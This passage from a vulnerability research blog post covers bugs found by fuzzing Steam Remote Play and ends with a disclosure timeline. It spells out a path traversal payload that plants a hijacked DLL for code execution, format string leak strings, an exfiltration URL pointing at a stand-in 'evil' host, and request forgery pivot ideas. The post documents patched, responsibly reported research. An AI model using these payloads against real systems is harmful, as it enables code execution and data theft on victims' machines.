The fuzzer could benefit from multiple improvements: for instance, it does not feature any dynamic instrumentation ability or code coverage, and it is not able to synchronize with the target either. But even though `rpfuzz` is rather naive and black-box driven, it proved to be largely sufficient to uncover several bugs, as discussed in the next section.

`pbfuzz` also comes with its own set of limitations. Namely: it only supports Protobuf 2, does not implement some concepts (like unions, maps or extensions that are practically non-existent in Remote Play), and could also feature better string mutators. However, it is rather efficient and malleable, and could be reused to fuzz other targets that feature Protobuf communications.

In order to monitor crashes, a simple way was to attach a debugger to the target in order to intercept crashes and analyze them. [PageHeap](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap) was also enabled, which is a must-have to keep track of any out-of-bounds access in the heap.

[Time Travel Debugging](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/time-travel-debugging-overview) is also another nice tool to have in the toolbox to analyze certain crashes or bigger schemes that involve more convoluted control flows. More specifically, the [ttddbg](https://github.com/airbus-cert/ttddbg) plugin for IDA is neat: it supports loading a TTD trace and debugging it.

# Vulnerabilities

A couple dozen of bugs were identified thanks to `rpfuzz`. They affect Remote Play in the Steam client, and also the Steam Link product. They should be replicable on other platforms (Linux, Android, iOS), although it was not verified for all of them.

A lot of these bugs are unexploitable and/or uninteresting, therefore in this post we will go through a couple of the more technically interesting ones in more detail.

The vulnerabilities that were found all target the client implementation, although a few minor bugs were also found in the server implementation.

Description| Impact  
---|---  
`CSetTouchIconDataMsg` path traversal file write| Remote code execution  
`CRemotePlayTogetherGroupUpdateMsg` format string bugs| Remote memory leak  
`CRemotePlayTogetherGroupUpdateMsg` request forgery| Info leak / pivot  
`CRemotePlayTogetherGroupUpdateMsg` out-of-bounds access| Type confusion  
Video channel YV12 data heap overflow| Remote (?) heap leak  
`CRemoteHIDMsg` gamepad input report heap overflow| Unknown  
  
## Path traversal file write in `CSetTouchIconDataMsg`

This vulnerability is a perfect example of the _“fuzzing is not only about crashes”_ rule: side effects of fuzzing on the system can also reveal bugs.

Here, we can see that weird-looking files with random (mutated) names and contents were created inside the client’s `SteamLink` application data folder:

[![Weird-looking files in SteamLink folder…](/posts/img/remoteplay/touchicon-files.png)](/posts/img/remoteplay/touchicon-files.png)

Fun fact: I only noticed these files by chance 5 months after their creation, which means this vulnerability could have been long fixed at the moment of my SSTIC talk…

`CSetTouchIconDataMsg` is a control message that allows the host of a Remote Play session to synchronize image files, such as controller binding icons originating from `C:\Program Files (x86)\Steam\tenfoot\resource\images\library\controller\binding_icons`. The icons are then downloaded into `%APPDATA%\Valve Corporation\SteamLink`.

The protobuf definition for this message type is the following:
  
  
  message CSetTouchIconDataMsg {
  optional uint32 appid = 1;
  optional string icon = 2;
  optional bytes data = 3;
  }
  

When the client receives an `icon` field that starts with `"@"`, it is first MD5-hashed:
  
  
  if (icon_name[0] == '@') {
  MD5_Init(&ctx);
  MD5_Update(&ctx, &appid, 4);
  MD5_Update(&ctx, icon_name, strlen(icon_name));
  MD5_Final(&ctx, &path);
  }
  

However, if the icon name does not start with `"@"`, the client directly uses it as a relative path for a file write inside the `SteamLink` application data folder. The host therefore fully controls the name of the file to write (`icon`), but also the contents that are written to this file (`data`).

An attacker can abuse this fact to write an arbitrary file on the victim’s file system by leveraging path traversal. Files can even be overwritten, and folders created recursively if they do not exist.

From there, many techniques can be applied to achieve **remote code execution**. I chose to illustrate the vulnerability with a basic DLL hijack.

Using Process Monitor, one can notice that the Steam client attempts to load `winhttp.dll`, a DLL that is not found inside the Steam folder and thus fetched from System32.

By sending the icon string `../../../../../../Program Files (x86)/Steam/winhttp.dll`, we can create an arbitrary DLL inside the victim’s Steam folder. When the streaming client (or Steam) restarts, it will load the hijacked DLL: arbitrary code can then be executed.

Here is a video proof-of-concept:

The video shows both the attacker’s computer and the victim’s. The attacker invites the victim to a Remote Play session in the game _Ultimate Tic-Tac-Toe_. Note: here the victim is a friend, but this is not necessary; the attacker could have generated an invite link and sent it to anyone.

Once the session is established, the attacker silently delivers the payload by injecting a DLL into their own Steam process. Then, the victim is kicked out of the session. When they restart the Steam client, `calc.exe` shows up instead.

Valve patched the vulnerability by ensuring all icon names are MD5-hashed, independently of the first character being a `"@"` or not.

## Format string bugs in `CRemotePlayTogetherGroupUpdateMsg`

Earlier, this message type was given as an example of a rather complex message type that could conceal many bugs. Well, this was done on purpose, because it is really full of bugs: the three next vulnerabilities we are going to cover all target this structure.
  
  
  message CRemotePlayTogetherGroupUpdateMsg {
  message Player {
  optional uint32 accountid = 1;
  optional uint32 guestid = 2;
  optional bool keyboard_enabled = 3;
  optional bool mouse_enabled = 4;
  optional bool controller_enabled = 5;
  repeated uint32 controller_slots = 6;
  optional bytes avatar_hash = 7;
  }
  
  repeated .CRemotePlayTogetherGroupUpdateMsg.Player players = 1;
  optional int32 player_index = 2;
  optional string miniprofile_location = 3;
  optional string game_name = 4;
  optional string avatar_location = 5;
  }
  

This message is basically sent by the session host to notify the guest of various things: who are the players in the current session, where are their avatars stored, etc.

[![](/posts/img/remoteplay/rpt-group-update.png)](/posts/img/remoteplay/rpt-group-update.png)

There are **two distinct format string vulnerabilities** in the code that handles this message.

In the `CMiniProfileLoader::LoadProfiles` function, a loop iterates over the `players` list.
  
  
  while (n_players--) {
  Player = *Players++;
  
  if (Player->accountid) {
  CMiniProfileLoader::LoadAccountProfile(
  this,
  RemotePlayTogetherGroupUpdateMsg->miniprofile_location,
  Player->accountid
  );
  }
  
  else if (Player->guestid) {
  binarytohex(Player->avatar_hash, avatar_hash_size, hash_hex, 41);
  CUtlString::Format(
  url,
  RemotePlayTogetherGroupUpdateMsg->avatar_location,
  hash_hex,
  hash_hex
  );
  CMiniProfileLoader::LoadGuestProfile(this, url, Player->guestid);
  free(url);
  }
  }
  

When an `accountid` field is provided in the current player object in the list, the `CMiniProfileLoader::LoadAccountProfile` method eventually calls:
  
  
  CUtlFmtString::CUtlFmtString(url, miniprofile_location, accountid);
  

**The`miniprofile_location` field is naively used as a string formatter**, which is controlled by the attacker (host). They also control the first argument to the format string (`accountid`).

Therefore, the host can leak arbitrary memory from the process, using formatters such as `%x` and `%s` (unfortunately, the `%n` formatter is disabled by default, thus no write primitive).

The formatted string is then later used as a URL and a CURL request is performed.

There are two ways the attacker can retrieve back the formatted string:

  1. Exfiltrate over HTTP (e.g. set `miniprofile_location` to `http://evil/%x` and log the request);
  2. Read received debug strings over the _Stats_ channel (0x2).

The second option is the easiest one to carry out since it happens automatically. Indeed, by setting the `miniprofile_location` field to `"Leak: %08x.%08x.%08x.%08x"`, the CURL request fails and a debug string that looks like the following is output:
  
  
  DebugString: "Web request Leak: 13374242.11fe0ff0.11fe0fec.13374242 failed, CURL error code 3, HTTP error code 0"
  

We haven’t talked about the _Stats_ channel much yet. It implements a few message types:
  
  
  enum EStreamStatsMessage {
  k_EStreamStatsFrameEvents = 1;
  k_EStreamStatsDebugDump = 2;
  k_EStreamStatsLogMessage = 3;
  k_EStreamStatsLogUploadBegin = 4;
  k_EStreamStatsLogUploadData = 5;
  k_EStreamStatsLogUploadComplete = 6;
  }
  

In this channel exists a type of message used to send over log messages: `k_EStreamStatsLogMessage`, which protobuf definition is the following.
  
  
  message CLogMsg {
  optional int32 type = 1;
  optional string message = 2;
  }
  

The streaming client happens to **always automatically send all the debug strings over to the host** via this channel and message! They’re even in plaintext.

Thus, the attacker retrieves the leaks without effort.

The second format string vulnerability is highly similar to the first one. When `guestid` is set, the following call is performed:
  
  
  CUtlString::Format(
  url,
  RemotePlayTogetherGroupUpdateMsg->avatar_location,
  hash_hex,
  hash_hex
  );
  

Again, `avatar_location` is a host-controlled field and is used as a string formatter. Since the formatted string is also used as a URL inside a CURL request, the same exfiltration techniques as before apply.

In terms of impact, these vulnerabilities allow an attacker to reliably and fully break ASLR on the victim’s machine, which is very often the first step to a memory corruption exploit.

More particularly on Windows, breaking ASLR for various Steam-related DLLs (such as `steamclient.dll`) or other Windows DLLs can greatly help to further compromise the system in any other attack targeting the Steam client.

An attacker could also practically leak anything in the process’ memory, including potentially sensitive data (environment variables, paths, tokens…).

Valve patched these vulnerabilities by denying URLs that contain the character `'%'`.

## Request forgery in `CRemotePlayTogetherGroupUpdateMsg`

This vulnerability is a direct follow-up to the previous one.

Since the `miniprofile_location` field is a fully host-controlled URL, **an attacker can make the client perform an arbitrary HTTP(S) GET request** (sadly, other wrappers such as `file://` are disabled by the CURL options set in the client).

At this point, the client expects the CURL response to be a valid JSON file, which will in turn be parsed. However, if the response is **not** a valid JSON string, the following debug string will be output and sent back to the attacker:
  
  
  "Couldn't parse profile data: syntax error at line 1 near: <RESPONSE CONTENTS>"
  

An attacker can exfiltrate the response to any HTTP GET request performed client-side! As long as the output is not JSON, of course.

This gives a so-called SSRF primitive (server side request forgery), but here I would rather call it a CSRF because the vulnerability lies on the client’s side — although the acronym CSRF is usually “reserved” for the _cross-site request forgery_ web vulnerability…

With such a primitive, an attacker could leak potentially sensitive data hosted on local web pages or over an internal network. They could also scan the victim’s internal network for recon (IP ranges, port scan).

If a vulnerable internal service is found, an attacker could even pivot by exploiting it through GET requests (e.g. SQL injection in GET parameter): the possibilities are endless.

Just for fun, we can try going a little deeper. I said the client expects a JSON string from the response, but what kind? Since the attacker controls it, it could be an additional attack vector.

It appears that the client expects a JSON like the following:
  
  
  {
  "avatar_url": "http://site/toto.png",
  "persona_name": "xyz"
  }
  

The client will then download the avatar and put it in local storage (usually in `%AppData%\Roaming\Valve Corporation\SteamLink`). For instance, `toto.png` will be saved to `avatars/to/toto.png`:
  
  
  CUtlFmtString::CUtlFmtString(v14, "%s/avatars/%.2s/%s", StoragePath, filename, filename);
  

Unfortunately, there is no way to inject a `"/"` or `"\"` to perform path traversal here. Best I could do is write a file to the parent folder: with a filename like `..toto.txt`, the saved file will be `avatars/../..toto.txt`, so `..toto.txt` will end up in the local storage root folder. But since in this case the filename starts with `..`, we won’t be able to override any interesting configuration file.

One may also drop a malicious file inside the avatars folder, but there is no way to execute it. You could also create a folder using an NTFS alternate data stream like `toto::$INDEX_ALLOCATION` (a lesser-known trick… but pointless).

Valve patched this vulnerability by introducing a whitelist domain filter.

## OOB access in `CRemotePlayTogetherGroupUpdateMsg`

This bug resides yet again in the `CRemotePlayTogetherGroupUpdateMsg` message, but this time, in the `player_index` field:
  
  
  message CRemotePlayTogetherGroupUpdateMsg {
  message Player {
  optional uint32 accountid = 1;
  optional uint32 guestid = 2;
  optional bool keyboard_enabled = 3;
  optional bool mouse_enabled = 4;
  optional bool controller_enabled = 5;
  repeated uint32 controller_slots = 6;
  optional bytes avatar_hash = 7;
  }
  
  repeated .CRemotePlayTogetherGroupUpdateMsg.Player players = 1;
  optional int32 player_index = 2;  // <---
  optional string miniprofile_location = 3;
  optional string game_name = 4;
  optional string avatar_location = 5;
  }
  

As you can see, `player_index` is a signed 32-bit integer. It is used to notify the client of which index in the `players` list corresponds to the host player in the session.

In order to reproduce this bug, the host must send two messages:

  1. The `CRemotePlayTogetherGroupUpdateMsg` with a large enough `player_index`;
  2. A certain `CSetStreamingClientConfig` message that will actually trigger the bug.

Indeed, sending a certain `CSetStreamingClientConfig` message to the client (which I didn’t exactly characterize — I only replayed the same message that my fuzzer stumbled upon) causes the `CRemotePlayTogetherDialog::Update` method to be called:
  
  
  do {
  
  Player = Players[k];
  
  is_host = k == this->player_index;
  if ( k == this->n_players - 1 && this->player_index > k ) {
  is_host = 1;
  Player = Players[this->player_index];
  }
  
  // ...
  CRemotePlayTogetherDialog::UpdatePlayerState(
  this,
  /* ... */,
  Player,
  is_host
  );
  
  } while ( ++k < this->n_players );
  

There is basically a loop over a list of players. The `Player` variable should be a valid pointer to a `CRemotePlayTogetherGroupUpdateMsg_Player` structure that represents a player, especially when it is passed over to `CRemotePlayTogetherDialog::UpdatePlayerState`.

It turns out that `this->player_index` is the `player_index` value from the latest seen `CRemotePlayTogetherGroupUpdateMsg` message, which the attacker controls.

At the last loop iteration, since `this->player_index > k` is a signed comparison, the attacker can only enter the highlighted branch if `player_index` is a _positive_ signed integer. But other than that, verifying the condition is trivial and leaves a lot of room to go out of bounds, relatively to the start of the players vector.

Even better: if through `CRemotePlayTogetherGroupUpdateMsg` the attacker has never sent a list of players before, then `Players` is NULL, and this fact is never checked. Since the client lives in a 32-bit process, the attacker can pretty much point to anywhere in memory.

This effectively leads to type confusion: we could fake a _Player_ structure somewhere in memory (maybe with some heap spraying) and given an ASLR leak, fake the `Player` object that is passed to the `UpdatePlayerState` method.

If this latter function wrote to fields of the `Player` structure, this would give an arbitrary write primitive.

[![Integer overflow in CRemotePlayTogetherGroupUpdateMsg](/posts/img/remoteplay/rpt-integer-overflow.png)](/posts/img/remoteplay/rpt-integer-overflow.png)

Unfortunately, the `UpdatePlayerState` method doesn’t do anything really interesting with the `Player` structure: barely a few read accesses (that are in turn not used for any other write access).

Still, this bug highlights how some bugs can be stateful, and how fuzzing many message types at once can help uncover those.

## Heap overflow in YV12 video frames

We saw that in order to transmit audio and video data, several codecs and formats are available.

Before sending video data, the host must send a `CStartVideoDataMsg` message and specify a video codec:
  
  
  message CStartVideoDataMsg {
  required uint32 channel = 1;
  optional .EStreamVideoCodec codec = 2 [default = k_EStreamVideoCodecNone];
  optional bytes codec_data = 3;
  optional uint32 width = 4;
  optional uint32 height = 5;
  }
  
  enum EStreamVideoCodec {
  k_EStreamVideoCodecNone = 0;
  k_EStreamVideoCodecRaw = 1;
  k_EStreamVideoCodecVP8 = 2;  // unimplemented?
  k_EStreamVideoCodecVP9 = 3;  // unimplemented?
  k_EStreamVideoCodecH264 = 4;
  k_EStreamVideoCodecHEVC = 5;
  k_EStreamVideoCodecORBX1 = 6;  // unimplemented?
  k_EStreamVideoCodecORBX2 = 7;  // unimplemented?
  }
  

If the host chooses the _raw_ codec, they can send video frames with raw pixel data over the newly opened channel. The structure for video frames becomes the following:

Field| Size (bytes)  
---|---  
Packet type (`k_EStreamDataPacket`)| 1  
Video sequence number| 2  
Timestamp| 4  
Unknown| 6  
Length of protobuf data| 1  
Protobuf data (`CVideoFormat`) message| variable  
Raw video data| variable  
  
First of all, the length field for the protobuf serialized data is not even checked, so the client may try to deserialize out-of-bounds heap data up to 256 bytes and crash, although this fact is unexploitable for an info leak.

The `CVideoFormat` message specifies the data format of the frame, and its dimensions:
  
  
  message CVideoFormat {
  required .EVideoFormat format = 1 [default = k_EVideoFormatNone];
  optional uint32 width = 2;
  optional uint32 height = 3;
  }
  

As shown in the codec and format tree diagram earlier, the raw codec implements two distinct encoding formats:
  
  
  enum EVideoFormat {
  k_EVideoFormatNone = 0;
  k_EVideoFormatYV12 = 1;
  k_EVideoFormatAccel = 2;
  }
  

The vulnerability specifically lies in the _YV12_ format. When frames are rendered inside `CStreamPlayer::BUpdateVideo`, here is what happens:
  
  
  if ( VideoFormat == k_EVideoFormatYV12 ) {
  // [...]
  SDL_UpdateYUVTexture(texture, 0, Yplane, Ypitch, Uplane, Upitch, Vplane, Vpitch);
  SDL_RenderCopy(renderer, texture, src_rect, dst_rect);
  }
  

The Y, U, V planes passed to `SDL_UpdateYUVTexture` are pointers to different sections inside the video data. These pointers depend on the host-provided frame dimensions.

> _YUV, or YCbCr, is a type of color space that uses one luminance component and two chrominance components. Initially designed for television, it is more efficient than RGB for visual perception._
> 
> [![YUV color space explanation](/posts/img/remoteplay/YUV.jpg)](/posts/img/remoteplay/YUV.jpg)

However, no check is performed on the size of the video data sent by the host. Thus, an attacker can specify large frame dimensions, but send less video data than expected.

[![YV12 heap overflow](/posts/img/remoteplay/yv12-overflow.png)](/posts/img/remoteplay/yv12-overflow.png)

A heap overflow occurs inside `SDL_UpdateYUVTexture`, and a lot of heap memory is leaked. The whole texture is rendered anyways, and the client may see something like this:

[![YV12 video leak demo](/posts/img/remoteplay/video-leak.png)](/posts/img/remoteplay/video-leak.png)

I thought of a way to exfiltrate the leak, but it’s not the most convincing and requires an extra user interaction, hence why I may not go as far as calling the vulnerability a remote heap leak:

  1. Send a malicious `CStreamingClientConfig` message to the client that will enable the performance overlay.
  2. Ask the client to press “F8”. As the performance overlay is enabled, this will silently upload a screenshot of the rendered SDL window to the host.
  3. Listen to the _Stats_ channel (`CDebugDumpMsg`) to retrieve a PNG file containing the texture, and convert the RGB pixels to YUV to read the leaked heap data.

The second step can be done through various ways, such as direct social engineering, or sending fake video data that tricks the client player into pressing F8 as if it were a game mechanic… but nothing cannot be done without additional user interaction.

I also wondered whether the server had the ability to remap the victim’s keyboard in order to trick them into uploading a screenshot by pressing any other key, but couldn’t work it out.

Moreover, converting the leaked pixels back from RGB to YUV space is not trivial as the conversion is not lossless in practice, partly because of floating point calculation.

Similar, funny heap leaks were also found in the `CSetIconMsg` and `CSetCursorImageMsg` messages, which allow the host to send raw RGBA images to set as window icon and system cursor.

Again, both components suffer from out-of-bounds read accesses in the heap because the image data size is not properly checked. For instance, here is a leaky 128px * 128px cursor:

[![Heap leak in CSetCursorImageMsg](/posts/img/remoteplay/cursor-leak.png)](/posts/img/remoteplay/cursor-leak.png)

## Heap overflow in `CRemoteHIDMsg` gamepad logic

This bug was found by fuzzing the client while an X-Box controller was plugged in (XInput device).

First, the device should be opened through a `CHIDMessageToRemote.DeviceOpen` message, by specifying a path like `sdl://1`.

When the host asks for HID input reports, the following message is sent:
  
  
  message DeviceStartInputReports {
  optional uint32 device = 1;
  optional uint32 length = 2;
  }
  

Then, the report generator component (`CHIDDeviceReportGenerator`) collects the reports and allocates a `CUtlBuffer` object to store them, of attacker-controlled size (`length` field), but which cannot exceed 27 bytes.

Eventually, the serializing logic (`HIDDeviceSDLGamepadStateV2_t::Pack`) writes to this buffer. If the attacker provided `length` field is too small, there is an out-of-bounds write in the heap.

The overflow is very small (a few bytes) and the attacker is not in control of the written contents, which originate from a controller-specific structure (joystick axis, button data…).

This renders the exploitation very hard, but perhaps not impossible; it was not explored further.

# Timeline

Date |  
---|---  
2022-10-12| I submit a **1st report** on HackerOne about the format string & request forgery vulnerabilities.  
2022-10-18| H1 analyst fails at reproducing the PoC; most likely because they did not adjust a certain function offset that varies between Steam versions (of course, the delay between the responses and the frequent Steam updates didn’t help the case). I respond in less than an hour and offer help to analyze their DLL to find the correct offset.  
2022-11-01| H1 analyst declines my help and instead asks for detailed instructions as to how they can reverse engineer the DLL themselves to find the offset.  
2022-11-01| Valve staff member changes the report status to _Triaged_.  
2022-11-05| I provide detailed instructions on how to retrieve the function offset needed to make the PoC work on IDA with screenshots. Not sure if this ever helped since I have never heard back from the H1 analyst (obviously Valve would have no use of such instructions since they have Steam’s source code and PDB symbols).  
2022-11-08| Valve rewards me with a bounty and pushes a fix on the Steam Client Beta channel.  
2022-11-09| I take a look at the fix, and notice only the request forgery vulnerabilities have been seemingly patched: the format strings remained untouched. Since the fix is not necessarily trivial, I suggest a few ideas of potential workarounds.  
2022-12-14| I come back at them after a month without news.  
2023-01-11| I come back at them after two months without news. At this point I have also asked several times whether they are fine with me communicating on my findings once patches are live.  
2023-01-17| Valve rewards me with an additional bonus bounty and pushes a new, working fix on the Steam Client Beta channel. However, they still pay no attention to my questions regarding disclosure and I will never get an answer.  
2023-01-20| I submit a **2nd report** on HackerOne that gathers a few more minor vulnerabilities at once (including the heap overflows).  
2023-01-24| H1 analyst asks for fully working PoCs for each single bug. I explain that I do not plan on providing those for several reasons (one of them being that developing standalone PoCs in these scenarios is highly time-consuming). I even let them know that I don’t mind not being rewarded a bounty, as long as the bugs get through Valve so that I can communicate on them at the SSTIC conference.  
2023-03-21| I come back at them after two months without news, and try to pressure them as the SSTIC deadline is getting near.  
2023-04-11| H1 analyst informs me that Valve “didn’t reach a final decision regarding the report” (?) and warns me that disclosure would go against H1’s policy (actually, [their guidelines do state](https://www.hackerone.com/disclosure-guidelines) that, for transparency reasons, finders are encouraged to disclose their reports if the team is unresponsive for around 6 months).  
2023-06-08| I present my [work](https://www.sstic.org/2023/presentation/bug_hunting_in_steam_remote_play/) at the SSTIC conference. I receive a lot of positive feedback, which motivates me to come back on my work and spend a few days looking for an RCE (which I did not have yet at this point).  
2023-06-13| Valve staff member changes the 2nd report status to _Triaged_ and rewards me with a bounty. Maybe they heard of my talk?  
2023-06-19| I discover the file write RCE and submit a **3rd report** on HackerOne with a fully working PoC and a video.  
2023-06-20| Valve staff member changes the 3rd report status to _Triaged_ and pushes a fix to the Steam Client Beta channel (in one day!). However, they lower the severity from _Critical_ to _High_ and reward me with a smaller bounty. I try to explain to them that the vulnerability is indeed _Critical_ , as they seem to have misunderstood a certain component of the CVSS rating system.  
2023-07-18| I come back at them after a month without news. Valve won’t reassess the severity to _Critical_ (not sure why), but they do readjust the bounty correctly.  
2023-07-25| Valve silently closes the 2nd report; fixes are seemingly pushed to the Steam Client Beta channel.  
  
# Conclusion

In this blog post, we have covered several captivating aspects of vulnerability research:

  * choosing a target and delimiting an attack surface;
  * reverse engineering a product to bring out its software architecture;
  * reverse engineering a protocol and constructing a partial specification;
  * deducing a minimalist implementation to communicate with the client (or server);
  * building a fuzzer upon all this work;
  * analyzing crashes, exploiting bugs and assessing risk.

On a more personal note, I find it very satisfying to start analyzing such a product from zero and being able to progressively disentangle so much hidden knowledge, up to a point where you become able to do all the things listed above.

Regarding Valve, I had read many complaints from other security researchers about them being awfully slow to validate reports and all other kinds of terrible experiences, so I didn’t get my hopes too high up when I began submitting my reports.

Although my experience with the reporting and the coordinated vulnerability disclosure was not perfect, I was still pleasantly surprised by how fast some of my reports were treated (the more critical ones) and the bounties paid.

[#Reverse Engineering](/tags/reverse-engineering)

[#Vulnerability Research](/tags/vulnerability-research)

[#RCE](/tags/rce)

2023-12-04 by Valentino Ricotta
